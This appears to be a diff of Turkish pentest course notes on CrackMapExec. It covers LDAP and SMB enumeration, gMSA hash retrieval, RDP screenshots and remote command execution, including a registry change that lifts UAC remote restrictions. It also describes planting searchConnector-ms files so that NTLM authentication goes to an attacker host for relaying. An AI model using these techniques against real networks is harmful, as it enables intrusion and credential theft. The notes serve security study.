+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --admin-count`            | `adminCount=1` derecesine sahip objeleri listeler.                                                 |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --get-sid`                | Domainin SID bilgisini alır.                                                                       |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --gmsa`                   | GMSA (Gruplandırılmış Yönetici Hizmet Hesapları) şifrelerini listeler.                             |
+| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --nla-screenshot`          | NLA (Ağ Seviyesinde Kimlik Doğrulaması) devre dışı ise RDP giriş ekranının ekran görüntüsünü alır. |
+| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --screenshot`              | Bağlantı başarılıysa RDP oturumunun ekran görüntüsünü alır.                                        |
+| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --screentime`              | Masaüstü görüntüsü için bekleme süresini belirtir.                                                 |
+| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --res RES`                 | Çözünürlük belirler (örnek format: WIDTHxHEIGHT, varsayılan: 1024x768).                            |
 
+Henüz çalışmadıklarımız varsa onları gözden geçirelim.
 
 ### Enumerating Users and Groups
 
-SMB protokolünde yaptığımız gibi, LDAP ile de kullanıcıları ve grupları listeleyebiliriz:
+SMB protokolünde yaptığımız gibi, `LDAP` ile de kullanıcıları ve grupları listeleyebiliriz:
 
 ### Enumerating Users and Groups
 
-![Pasted image 20241202225710.png](/img/user/resimler/Pasted%20image%2020241202225710.png)
-![Pasted image 20241202225721.png](/img/user/resimler/Pasted%20image%2020241202225721.png)
-![Pasted image 20241202225733.png](/img/user/resimler/Pasted%20image%2020241202225733.png)
-![Pasted image 20241202225743.png](/img/user/resimler/Pasted%20image%2020241202225743.png)
+{{CODE_BLOCK_137}}
 
-Not: Domain FQDN'sini çözümleyemezsek LDAP protokol iletişimlerinin çalışmayacağını unutmayın. Domain DNS sunucularına bağlanmıyorsak, FQDN'yi /etc/hosts dosyasında yapılandırmamız gerekir
+Not: Domain FQDN'sini çözümleyemezsek LDAP protokol iletişimlerinin çalışmayacağını unutmayın. Domain DNS sunucularına bağlanmıyorsak, FQDN'yi `/etc/hosts` dosyasında yapılandırmamız gerekir
 
 
 ### İlginç Hesap Özelliklerini Numaralandırma
 
-ldap protokolü, PASSWD_NOTREQD veya TRUSTED_FOR_DELEGATION bayrağı ile hesapları tanımlamamıza yardımcı olacak birkaç seçeneğe daha sahiptir ve hatta adminCount değeri 1 olan tüm hesapları sorgulayabiliriz.
+`ldap` protokolü, `PASSWD_NOTREQD` veya `TRUSTED_FOR_DELEGATION` bayrağı ile hesapları tanımlamamıza yardımcı olacak birkaç seçeneğe daha sahiptir ve hatta `adminCount` değeri `1` olan tüm hesapları sorgulayabiliriz.
 
-PASSWD_NOTREQD hesap denetimi özniteliği ayarlanmışsa, kullanıcı geçerli parola ilkesi uzunluğuna tabi değildir, yani daha kısa bir parolaya sahip olabilir veya hiç parola kullanmayabilir ( domain'de boş parolalara izin veriliyorsa). Bu hesapları tanımlamak için --password-notrequired seçeneğini kullanabiliriz.
-
-
-### PASSWD_NOTREQD Özniteliğinin Tanımlanması
-
-![Pasted image 20241202230116.png](/img/user/resimler/Pasted%20image%2020241202230116.png)
-![Pasted image 20241202230124.png](/img/user/resimler/Pasted%20image%2020241202230124.png)
-
-TRUSTED_FOR_DELEGATION özniteliği ayarlanırsa, bir hizmetin altında çalıştığı hizmet hesabı (kullanıcı veya bilgisayar) Kerberos yetkilendirmesi için güvenilirdir, yani hizmeti talep eden bir istemciyi taklit edebilir. Bu saldırı türüne Kerberos Unconstrained Delegation adı verilir. Bu konu hakkında daha fazla bilgi edinmek için bu [blog](https://adsecurity.org/?p=1667) yazısını okuyabilirsiniz.
-
-### Kısıtlamasız Delegasyonun Belirlenmesi
-![Pasted image 20241202230729.png](/img/user/resimler/Pasted%20image%2020241202230729.png)
-
-adminCount özniteliği, SDProp işleminin bir kullanıcıyı koruyup korumadığını belirler. Bu işlemde, Active Directory'deki AdminSDHolder, korunan kullanıcı hesaplarının ACL izinleri için bir şablon görevi görür. Herhangi bir ACE hesabı değiştirilirse (örneğin, bir saldırgan tarafından), bu işlem tarafından korunan hesapların ACL izinleri, SDProp işlemi her çalıştığında şablon izin kümesine sıfırlanır; bu varsayılan olarak her 60 dakikada bir yapılır ancak değiştirilebilir. Değer 0 olarak ayarlanmışsa veya belirtilmemişse kullanıcı kapsam dışıdır. Öznitelik değeri 1 olarak ayarlanırsa kullanıcı korunur. Saldırganlar genellikle dahili bir ortamda hedef almak için adminCount özniteliği 1 olarak ayarlanmış hesapları ararlar. Bunlar genellikle ayrıcalıklı hesaplardır ve daha fazla erişime veya domain'in tamamen ele geçirilmesine yol açabilir.
+`PASSWD_NOTREQD` hesap denetimi attribute ayarlanmışsa, kullanıcı geçerli password policy uzunluğuna tabi değildir, yani daha kısa bir parolaya sahip olabilir veya hiç parola kullanmayabilir (domain'de boş parolalara izin veriliyorsa). Bu hesapları tanımlamak için  `--password-notrequired` seçeneğini kullanabiliriz.
 
 
-### adminCount Özniteliğini Sorgulama
-![Pasted image 20241202230901.png](/img/user/resimler/Pasted%20image%2020241202230901.png)
-![Pasted image 20241202230911.png](/img/user/resimler/Pasted%20image%2020241202230911.png)
-![Pasted image 20241202230921.png](/img/user/resimler/Pasted%20image%2020241202230921.png)
+### PASSWD_NOTREQD Attribute Tanımlanması
+
+{{CODE_BLOCK_138}}
+
+`TRUSTED_FOR_DELEGATION` attribute ayarlanırsa, bir servisin altında çalıştığı servis hesabı (kullanıcı veya bilgisayar) Kerberos yetkilendirmesi için güvenilirdir, yani servisi talep eden bir client'i taklit edebilir. Bu saldırı türüne `Kerberos Unconstrained Delegation` adı verilir. Bu konu hakkında daha fazla bilgi edinmek için bu [blog](https://adsecurity.org/?p=1667) yazısını okuyabilirsiniz.
+
+### Unconstrained Delegation Belirlenmesi
+
+{{CODE_BLOCK_139}}
+
+`AdminCount` attribute, SDProp process'in bir kullanıcıyı koruyup korumadığını belirler. Bu process'te, Active Directory'deki `AdminSDHolder`, korunan user account'lar için ACL permissions'ın bir template'i olarak görev yapar. Eğer herhangi bir account ACE'si (örneğin, bir attacker tarafından) modified edilirse, bu process tarafından korunan account'ların ACL permissions'ı, `SDProp` process her çalıştığında (default olarak her 60 dakikada bir çalışır, ancak bu süre modified edilebilir) templated permission set'e resetlenir. User, adminCount değeri 0 olarak set edilmişse veya specified değilse bu koruma kapsamına girmez. Eğer attribute value 1 olarak set edilmişse, user korunur. Attacker'lar genellikle internal environment'ta adminCount attribute'i 1 olan account'ları target olarak arar. Bunlar genellikle privileged account'lardır ve further access veya full domain compromise ile sonuçlanabilir.
+
+
+### adminCount Attribute'u Sorgulama
+
+{{CODE_BLOCK_140}}
 
 
 ### Domain SID'sini numaralandırma
 
-Bazı domain saldırıları, kullanıcı veya domain SID'si gibi belirli domain bilgilerini edinmemizi gerektirir. SID (Security IDentifier), bir bilgisayarın veya domain controller'ın sizi tanımlamak için kullandığı benzersiz bir kimlik numarasıdır. Domain sid, domain'i tanımlayan benzersiz bir kimlik numarasıdır. CrackMapExec kullanarak domain sid'sini almak için --get-sid bayrağını kullanabiliriz:
+Bazı domain attack'ları, bir user veya domain SID gibi belirli domain bilgilerini elde etmemizi gerektirir. SID (Security IDentifier), bir computer veya domain controller'ın sizi tanımlamak için kullandığı `unique bir ID` numarasıdır. Domain SID ise domain'i tanımlayan unique bir ID numarasıdır. CrackMapExec kullanarak domain SID'i elde etmek için `--get-sid` flag'ini kullanabiliriz:
 
+### Domain SID'i Toplama
 
-### Gathering the Domain SID
-
-![Pasted image 20241202231106.png](/img/user/resimler/Pasted%20image%2020241202231106.png)
-![Pasted image 20241202231112.png](/img/user/resimler/Pasted%20image%2020241202231112.png)
+{{CODE_BLOCK_141}}
 
 
 ### Group Managed Service Accounts (gMSA)
@@ -7064,138 +7851,158 @@ Bağımsız Yönetilen Hizmet Hesabı (standalone Managed Service Account) (sMSA
 * Basitleştirilmiş service principal name (SPN) yönetimi.
 * Yönetimi diğer yöneticilere devretme yeteneği
 
-Bu yönetilen hizmet hesabı (MSA) türü Windows Server 2008 R2 ve Windows 7'de tanıtılmıştır.
+Bu yönetilen servis hesabı (MSA) türü Windows Server 2008 R2 ve Windows 7'de tanıtılmıştır.
 
 Group Managed Service Account (gMSA) domain içinde aynı işlevselliği sağlar ancak aynı zamanda bu işlevselliği birden fazla sunucuya genişletir.
 
 Bir gMSA hesabının parolasını okuma ayrıcalıklarına sahip bir hesabı belirlemek için PowerShell'i kullanabiliriz (komut yürütmeyi bir sonraki bölümde daha ayrıntılı olarak ele alacağız):
 
-
 ### Enumerating Accounts with gMSA Privileges
-![Pasted image 20241202231402.png](/img/user/resimler/Pasted%20image%2020241202231402.png)
-![Pasted image 20241202231409.png](/img/user/resimler/Pasted%20image%2020241202231409.png)
 
-Yukarıdaki örnekte, engels kullanıcısının PrincipalsAllowedToRetrieveManagedPassword ayrıcalığına sahip olduğunu görebiliriz, bu da svc_inlaneadm$ gMSA hesabının parolasını okuyabileceği anlamına gelir. gMSA parolasını okuma hakkına sahip bir hesabı tehlikeye atarsak, hesabın NTLM parola hash'ini almak için --gmsa seçeneğini kullanabiliriz.
+{{CODE_BLOCK_142}}
+
+
+Yukarıdaki örnekte, `engels` kullanıcısının `PrincipalsAllowedToRetrieveManagedPassword` ayrıcalığına sahip olduğunu görebiliriz, bu da `svc_inlaneadm$` gMSA hesabının parolasını okuyabileceği anlamına gelir. gMSA parolasını okuma hakkına sahip bir hesabı tehlikeye atarsak, hesabın `NTLM` parola hash'ini almak için `--gmsa` seçeneğini kullanabiliriz.
 
 
 ### gMSA Parolasını Edinme
-![Pasted image 20241202231528.png](/img/user/resimler/Pasted%20image%2020241202231528.png)
+
+{{CODE_BLOCK_143}}
 
 Bu kimlik bilgilerini kullanmak için, hash'ler için -H seçeneğini kullanabiliriz.
 
-
 ### svc_inlaneadm$ Hesabı ile Paylaşılan Klasörleri İnceleme
-![Pasted image 20241202231553.png](/img/user/resimler/Pasted%20image%2020241202231553.png)
-![Pasted image 20241202231601.png](/img/user/resimler/Pasted%20image%2020241202231601.png)
 
+{{CODE_BLOCK_144}}
+
+
+---
 
 ### RDP Screenshots
-RDP protokolü aracılığıyla kullanıcı adlarını numaralandırmak için CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnızca NLA ile izin verme seçeneği devre dışı bırakılmışsa, oturum açma isteminin ekran görüntüsünü almak için --nlascreenshot seçeneğini kullanabiliriz
+
+RDP protokolü aracılığıyla kullanıcı adlarını numaralandırmak için CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnızca `NLA` ile izin verme seçeneği devre dışı bırakılmışsa, oturum açma isteminin ekran görüntüsünü almak için `--nlascreenshot` seçeneğini kullanabiliriz
 
 
 ### Enumerate Login Prompt
-![Pasted image 20241202231656.png](/img/user/resimler/Pasted%20image%2020241202231656.png)
+
+{{CODE_BLOCK_145}}
 
 Ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz.
 
 
-### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma
-![Pasted image 20241202231729.png](/img/user/resimler/Pasted%20image%2020241202231729.png)
+### Ekran Görüntüsünü Açmak için MATE'in Eye Kullanma
+
+{{CODE_BLOCK_146}}
+
 ![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)
 
-Eğer bir kullanıcı adı ve parolamız varsa, --screenshot seçeneği ile RDP protokolünü kullanarak da ekran görüntüsü alabiliriz. Bu seçenek --screentime ile birleştirilebilir, varsayılan olarak 10, RDP bağlantısı açıldıktan sonra ekran görüntüsü almak için bekleyeceği süredir. Bu, bir hedef makineye bağlandığımızda ve hedefin masaüstünü yüklemesi 10 saniyeden fazla sürdüğünde kullanışlıdır.
+Eğer bir kullanıcı adı ve parolamız varsa, `--screenshot` seçeneği ile RDP protokolünü kullanarak da ekran görüntüsü alabiliriz. Bu seçenek `--screentime` ile birleştirilebilir, varsayılan olarak `10`, RDP bağlantısı açıldıktan sonra ekran görüntüsü almak için bekleyeceği süredir. Bu, bir hedef makineye bağlandığımızda ve hedefin masaüstünü yüklemesi 10 saniyeden fazla sürdüğünde kullanışlıdır.
 
-Ekran görüntüsü seçeneğiyle birleştirilebilecek bir diğer seçenek de RDP bağlantısı sırasındaki ekran çözünürlüğüne karşılık gelen --res seçeneğidir. Bu seçenek yararlıdır çünkü aktif bir RDP oturumu bulursak, kullanıcının ekranının boyutuna bağlı olarak tüm içeriği görebiliriz veya göremeyiz. Varsayılan olarak bu seçenek 1024x768 olarak ayarlanmıştır
-
-
-
-### Taking a Screenshot
-![Pasted image 20241202232439.png](/img/user/resimler/Pasted%20image%2020241202232439.png)
-![Pasted image 20241202232444.png](/img/user/resimler/Pasted%20image%2020241202232444.png)
+Ekran görüntüsü seçeneğiyle birleştirilebilecek bir diğer seçenek de RDP bağlantısı sırasındaki ekran çözünürlüğüne karşılık gelen `--res` seçeneğidir. Bu seçenek yararlıdır çünkü aktif bir RDP oturumu bulursak, kullanıcının ekranının boyutuna bağlı olarak tüm içeriği görebiliriz veya göremeyiz. Varsayılan olarak bu seçenek `1024x768` olarak ayarlanmıştır
 
 
-Not: --screentime ve --res isteğe bağlı bayraklardır.
+### Screenshot Alma
+
+{{CODE_BLOCK_147}}
+
+
+Not: `--screentime` ve `--res` isteğe bağlı bayraklardır.
 
 Son olarak, ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz:
 
 
 ### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma
-![Pasted image 20241202232517.png](/img/user/resimler/Pasted%20image%2020241202232517.png)
+
+{{CODE_BLOCK_148}}
+
 ![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)
 
-
-Bu bölümde, hedeflerimizi arşivlemeye yardımcı olabilecek LDAP ve RDP kullanarak çeşitli numaralandırma seçeneklerini araştırdık. Bir sonraki bölümde CrackMapExec kullanarak komutların nasıl çalıştırılacağı incelenecektir.
-
+Bu bölümde, hedeflerimize ulaşmamıza yardımcı olabilecek LDAP ve RDP kullanarak çeşitli numaralandırma seçeneklerini inceledik. Aşağıdaki bölüm, CrackMapExec kullanarak komutların nasıl çalıştırılacağını gözden geçirecektir.
 
 
-
+---
 
 ### Command Execution
 
-Remote target üzerinde local administrator olarak bir komut çalıştırmaya çalışmadan önce UAC'nin varlığını kontrol etmeliyiz. UAC etkinleştirildiğinde, ki bu varsayılan durumdur, yalnızca RID 500'e sahip yönetici hesabı (varsayılan yönetici) remote komutları yürütebilir. Durumun böyle olup olmadığını kontrol etmek için iki registry key vardır:
+Remote target üzerinde local administrator olarak bir komut çalıştırmaya çalışmadan önce `UAC`'nin varlığını kontrol etmeliyiz. UAC etkinleştirildiğinde, ki bu varsayılan durumdur, yalnızca `RID 500`'e sahip administrator hesabı (varsayılan administrator) remote komutları yürütebilir. Durumun böyle olup olmadığını kontrol etmek için iki registry key vardır:
 
-![Pasted image 20241203095807.png](/img/user/resimler/Pasted%20image%2020241203095807.png)
+`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`
+`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`
 
-Varsayılan olarak, LocalAccountTokenFilterPolicy değeri 0 olarak ayarlanmıştır, yani yalnızca built-in administrator hesabı (RID 500) yönetim görevlerini gerçekleştirebilir. Local administrator grubunda olsak bile, yalnızca kullanıcımızın RID'si 500 ise remote komutları çalıştırabiliriz. Değer 1 olarak ayarlanırsa tüm yönetici hesapları yönetim görevlerini yürütebilir.
+Varsayılan olarak, `LocalAccountTokenFilterPolicy` değeri 0 olarak ayarlanmıştır, yani yalnızca built-in administrator hesabı (RID 500) administration görevlerini gerçekleştirebilir. Local administrator grubunda olsak bile, yalnızca kullanıcımızın RID'si `500` ise remote komutları çalıştırabiliriz. Değer 1 olarak ayarlanırsa tüm administrative hesapları yönetim görevlerini yürütebilir.
 
-Yöneticinin yapılandırabileceği bir diğer ayar da local administrator hesabının (RID 500) uzaktan yönetim görevlerini yerine getirmesini engellemektir. Bu, FilterAdministratorToken kayıt defteri değerini 1 olarak ayarlayarak yapılabilir; bu, built-in administrator hesabının (RID 500) remote administrative tasks (uzaktan yönetim görevleri) gerçekleştiremeyeceği anlamına gelir.
+Administrator yapılandırabileceği bir diğer ayar da local administrator hesabının (RID 500) remote yönetim görevlerini yerine getirmesini engellemektir. Bu, `FilterAdministratorToken` registry değerini 1 olarak ayarlayarak yapılabilir; bu, built-in administrator hesabının (RID 500) remote administrative tasks (remote yönetim görevleri) gerçekleştiremeyeceği anlamına gelir.
 
 
+### Administrator Olarak Komut Yürütme
 
-### Command Execution as Administrator
-Komutları çalıştırmak ve administrators grubuna kimlerin üye olduğunu görmek için Administrator hesabını kullanalım. Windows komut satırı komutlarını çalıştırmak için -x seçeneğini ve ardından çalıştırmak istediğimiz komutu kullanmamız gerekir.
+Komutları çalıştırmak ve administrators grubuna kimlerin üye olduğunu görmek için Administrator hesabını kullanalım. Windows komut satırı komutlarını çalıştırmak için `-x` seçeneğini ve ardından çalıştırmak istediğimiz komutu kullanmamız gerekir.
 
 
 ### Bir Komutu Administrator Olarak Çalıştırma
-![Pasted image 20241203100035.png](/img/user/resimler/Pasted%20image%2020241203100035.png)
-![Pasted image 20241203100045.png](/img/user/resimler/Pasted%20image%2020241203100045.png)
+
+{{CODE_BLOCK_149}}
 
 
-### RID 500 Dışı Hesap Olarak Komut Yürütme
-Yukarıdaki komutta, localadmin local user Administrators grubundadır, ancak uzak komutu çalıştıramaz:
+### RID 500 Olmayan Hesap Olarak Komut Yürütme
+
+Yukarıdaki komutta, `localadmin` local user `Administrators` grubundadır, ancak remote komutu çalıştıramaz:
 
 ### Komutu localadmin olarak çalıştırma
-![Pasted image 20241203100238.png](/img/user/resimler/Pasted%20image%2020241203100238.png)
 
-Bu, UAC'nin etkin olduğu anlamına gelir. Eğer durum böyleyse, hesap yönetici olsa bile (Pwn3d!) mesajını almayacağız. Bu ayarı geri almak istiyorsak, LocalAccountTokenFilterPolicy'yi 1 olarak ayarlayabiliriz.
+{{CODE_BLOCK_150}}
+
+Bu, UAC'nin etkin olduğu anlamına gelir. Eğer durum böyleyse, hesap administrator olsa bile (Pwn3d!) mesajını almayacağız. Bu ayarı geri almak istiyorsak, `LocalAccountTokenFilterPolicy`'yi 1 olarak ayarlayabiliriz.
 
 
 ### LocalAccountTokenFilterPolicy'yi Değiştirme
-![Pasted image 20241203100321.png](/img/user/resimler/Pasted%20image%2020241203100321.png)
 
-![Pasted image 20241203100458.png](/img/user/resimler/Pasted%20image%2020241203100458.png)
+{{CODE_BLOCK_151}}
+
+
+{{CODE_BLOCK_152}}
 
 
 ### Domain Hesabı Olarak Komut Yürütme
-LocalAccountTokenFilterPolicy yalnızca local hesaplar için geçerlidir. Bir domain kullanıcımız varsa ve administrators grubunun bir parçasıysa, UAC ayarıyla bile komutu çalıştırabiliriz. Bu senaryoda, INLANEFREIGHT\robert hesabı administrators grubunun bir üyesidir, yani UAC etkin olsa bile komutları yürütebilir.
+
+`LocalAccountTokenFilterPolicy` yalnızca local hesaplar için geçerlidir. Bir domain kullanıcımız varsa ve `administrators` grubunun bir parçasıysa, UAC ayarıyla bile komutu çalıştırabiliriz. Bu senaryoda, `INLANEFREIGHT\robert` hesabı `administrators` `grubunun` bir üyesidir, yani UAC etkin olsa bile komutları yürütebilir.
 
 
 ### Komutu Robert olarak çalıştır
-![Pasted image 20241203100627.png](/img/user/resimler/Pasted%20image%2020241203100627.png)
+
+{{CODE_BLOCK_153}}
 
 
 ### SMB ile Komut Yürütme
-CME'nin dört (4) farklı komut yürütme yöntemi vardır:
-![Pasted image 20241203101103.png](/img/user/resimler/Pasted%20image%2020241203101103.png)
 
-Not: Tüm yöntemler tüm bilgisayarlarda çalışmayabilir.
+CME'nin dört (4) farklı komut yürütme yöntemi vardır:
+
+| Komut   | Açıklama                                                                                                                             |
+| ------- | ------------------------------------------------------------------------------------------------------------------------------------ |
+| wmiexec | WMI (Windows Management Instrumentation) kullanılarak komutlar yürütülür (`diskte dosya oluşturulur`).                               |
+| atexec  | Windows `görev zamanlayıcısı` ile bir görev planlayarak komutlar yürütülür (`fileless`, ancak Windows’un en son sürümünde çalışmaz). |
+| smbexec | Bir servis oluşturup çalıştırarak komutlar yürütülür (`fileless`, ancak Windows’un en son sürümünde çalışmaz).                       |
+| mmcexec | wmiexec yöntemine benzer, ancak komutlar Microsoft Yönetim Konsolu (MMC) aracılığıyla yürütülür.                                     |
+
+Not: Her yöntem her bilgisayarda çalışmayabilir.
 
 Varsayılan olarak, CME biri başarısız olursa farklı bir yürütme yöntemine geçecektir. Komutları aşağıdaki sırayla yürütmeye çalışır:
 
-![Pasted image 20241203101142.png](/img/user/resimler/Pasted%20image%2020241203101142.png)
+* 1. wmiexec 2. atexec 3. smbexec 4. mmcexec
 
-CME'yi yalnızca bir yürütme yöntemi kullanmaya zorlamak istiyorsak, örneğin --exec-method bayrağını kullanarak hangisini kullanacağımızı belirtebiliriz:
+CME'yi yalnızca bir yürütme yöntemi kullanmaya zorlamak istiyorsak, örneğin `--exec-method` bayrağını kullanarak hangisini kullanacağımızı belirtebiliriz:
 
 
 ### SMBExec Yöntemi ile Komut Yürütme
-![Pasted image 20241203101223.png](/img/user/resimler/Pasted%20image%2020241203101223.png)
+
+{{CODE_BLOCK_154}}
 
 Alternatif olarak, -X seçeneğini kullanarak PowerShell ile komutları çalıştırabiliriz:
 
-
 ### wmiexec aracılığıyla PowerShell Komut Yürütme
-![Pasted image 20241203101403.png](/img/user/resimler/Pasted%20image%2020241203101403.png)
-![Pasted image 20241203101435.png](/img/user/resimler/Pasted%20image%2020241203101435.png)
+
+{{CODE_BLOCK_155}}
+
 
 PowerShell seçeneği -X çalıştırıldığında, perde arkasında CrackMapExec aşağıdakileri yapacaktır:
 
@@ -8569,235 +9376,261 @@ Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP
 {{CODE_BLOCK_121}}
 
 ### drop-sc Modülü ile Hash'lerin Çalınması
-Bu bölümü tamamlamadan önce, **LNK** dışındaki bir dosya formatı kullanarak kimlik doğrulamayı zorlamanın başka bir yöntemine bakalım:[ **.searchConnector-ms**](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry) ve **.library-ms** formatları. Bu dosya formatlarının çoğu Windows sürümünde varsayılan dosya ilişkilendirmeleri bulunur. Windows ile entegre olarak, belirtilen bir WebDAV paylaşımı gibi uzaktaki bir konumu gösterebilecek şekilde, herhangi bir konumdan içerik görüntülemelerini sağlarlar.
 
-Özünde, LNK dosyası ile aynı fonksiyonu yerine getirirler. Bu yöntemin keşfi hakkında daha fazla bilgi edinmek için Windows'ta search connectors ve library dosyalarını keşfetmek başlıklı [blog](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/) yazısını okuyabilirsiniz.
+Bu bölümü tamamlamadan önce, **LNK** dışında başka bir dosya formatı kullanarak kimlik doğrulamasını zorlamanın başka bir yöntemine bakalım: **[.searchConnector-ms](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry)** ve **`.library-ms`** formatları. Bu dosya formatlarının çoğu Windows sürümünde **varsayılan dosya ilişkilendirmeleri** bulunur. Windows ile entegre çalışarak içeriği rastgele bir konumdan, hatta **`WebDAV` paylaşımıyla belirtilen remote bir konumdan** gösterebilirler.
 
-CrackMapExec, paylaşılan bir klasörde bir searchConnector-ms dosyası oluşturmamızı sağlayan drop-sc adlı bir modüle sahiptir. Bunu kullanmak için, SMB fake sunucumuzu hedeflemek için URL seçeneğini belirtmemiz gerekir. Bu durumda, ntlmrelayx çalıştıran hostumuz. URL'nin çift ters eğik çizgi (\) ile kaçması gerekir, örneğin: URL=\\\\10.10.14.33\\secret .
+Özetle, bu dosyalar **LNK** dosyasıyla aynı işlevi görür. Bu yöntemin keşfi hakkında daha fazla bilgi edinmek için **"[Exploring search connectors and library files in Windows](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/)"** başlıklı blog yazısını okuyabiliriz.
+
+CrackMapExec, **`drop-sc`** adında bir modüle sahiptir. Bu modül, paylaşılan bir klasörde **`searchConnector-ms`** dosyası oluşturmamıza olanak tanır. Kullanabilmek için **URL** seçeneğini belirterek **SMB fake sunucumuzu** hedef göstermemiz gerekir. Bu durumda, **`ntlmrelayx`** çalıştıran hostumuz olacaktır. **URL** değeri çift ters eğik çizgi (`\`) ile kaçırılmalıdır. Örneğin: **`URL=\\10.10.14.33\secret`**.
 
 İsteğe bağlı olarak aşağıdaki seçenekleri belirleyebiliriz:
 
-* SHARE=name seçeneği ile hedef paylaşımlı klasör . Bu seçeneği belirtmezsek, dosyayı WRITE izinlerine sahip tüm paylaşımlara yazacaktır
+* `SHARE=name` seçeneği ile hedef paylaşımlı klasör . Bu seçeneği belirtmezsek, dosyayı `WRITE` izinlerine sahip tüm paylaşımlara yazacaktır
 
-* FILENAME=name seçeneği ile dosya adı . Bu seçeneği belirtmezsek, “Belgeler” adında bir dosya oluşturacaktır.
+* `FILENAME=name` seçeneği ile dosya adı . Bu seçeneği belirtmezsek, “`Documents`” adında bir dosya oluşturacaktır.
 
-* Oluşturduğumuz dosyaları temizlemek istiyorsak CLEANUP=True seçeneği. Eğer özel bir isim kullanacaksak filename seçeneğini belirtmemiz gerekiyor.
+* Oluşturduğumuz dosyaları temizlemek istiyorsak `CLEANUP=True` seçeneği. Eğer özel bir isim kullanacaksak filename seçeneğini belirtmemiz gerekiyor.
 
 Drop-sc'yi iş başında görelim:
 
-
 ### Dropping a searchConnector-ms File
 
-![Pasted image 20241202202007.png](/img/user/resimler/Pasted%20image%2020241202202007.png)
+{{CODE_BLOCK_122}}
 
-![Pasted image 20241202202025.png](/img/user/resimler/Pasted%20image%2020241202202025.png)
+{{CODE_BLOCK_123}}
 
-Bir kullanıcı paylaşılan klasöre eriştiğinde ve ntlmrelayx dinlerken, hedef makineye de aktarım yapabilmeliyiz.
+Bir kullanıcı **paylaşılan klasöre** eriştiğinde ve **ntlmrelayx** dinleme modunda çalışırken, kimlik bilgilerini **hedef makineye yönlendirebilmemiz** gerekir.
 
+### NTLMRelayx ve drop-sc Kullanarak Yönlendirme
 
-### NTLMRelayx ve drop-sc Kullanarak Aktarma
+{{CODE_BLOCK_124}}
 
-![Pasted image 20241202202103.png](/img/user/resimler/Pasted%20image%2020241202202103.png)
-![Pasted image 20241202202112.png](/img/user/resimler/Pasted%20image%2020241202202112.png)
-
-Son olarak, CLEANUP=True seçeneği ile .searchConnector-ms dosyasını temizleyebiliriz:
+Son olarak, `CLEANUP=True` seçeneği ile `.searchConnector-ms` dosyasını temizleyebiliriz:
 
 
 ### searchConnector-ms Dosyalarını Temizleme
-![Pasted image 20241202202155.png](/img/user/resimler/Pasted%20image%2020241202202155.png)
-![Pasted image 20241202202201.png](/img/user/resimler/Pasted%20image%2020241202202201.png)
 
-LNK dosyaları genellikle bu tür saldırılar için bilinir. .searchConnector-ms gibi başka bir dosya türü kullanmak, fark edilmemenize yardımcı olabilir.
+{{CODE_BLOCK_125}}
 
 
-### SMB ile Eşleme ve Numaralandırma
+LNK dosyaları genellikle bu tür saldırılar için bilinir. `.searchConnector-ms` gibi başka bir dosya türü kullanmak, fark edilmemenize yardımcı olabilir.
+
+Sonraki bölümlerde CrackMapExec'in keşif seçeneklerini inceleyeceğiz.
+
+---
+
+
+### SMB ile Mapping ve Enumeration
 
 CrackMapExec, geçerli bir domain kullanıcı hesabıyla numaralandırma söz konusu olduğunda çok daha fazla seçenekle birlikte gelir. En çok kullanılan seçenekleri ele aldık, ancak daha derine inelim. İşte ayrıcalıklı olmasa bile geçerli bir hesap aldığımızda kullanabileceğimiz tüm seçeneklerin listesi:
 
-![Pasted image 20241202202635.png](/img/user/resimler/Pasted%20image%2020241202202635.png)
-![Pasted image 20241202202649.png](/img/user/resimler/Pasted%20image%2020241202202649.png)
+| Komut                                                                 | Açıklama                                                          |
+| --------------------------------------------------------------------- | ----------------------------------------------------------------- |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --loggedon-users` | Hedefte oturum açmış kullanıcıları listeler.                      |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --sessions`       | Hedefteki aktif oturumları listeler.                              |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --disks`          | Hedefteki diskleri listeler.                                      |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --computers`      | Hedef ağdaki bilgisayarları listeler.                             |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --wmi`            | Belirtilen WMI sorgusunu çalıştırır.                              |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --wmi-namespace`  | WMI Namespace’ini belirtir (varsayılan: `root\cimv2`).            |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --rid-brute`      | Hedef üzerinde RID brute-force yöntemiyle kullanıcıları listeler. |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --local-groups`   | Local grupları listeler; grup belirtilirse üyelerini listeler.    |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --shares`         | Hedefteki tüm paylaşım izinlerini listeler.                       |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --users`          | Hedefteki domain kullanıcılarını listeler.                        |
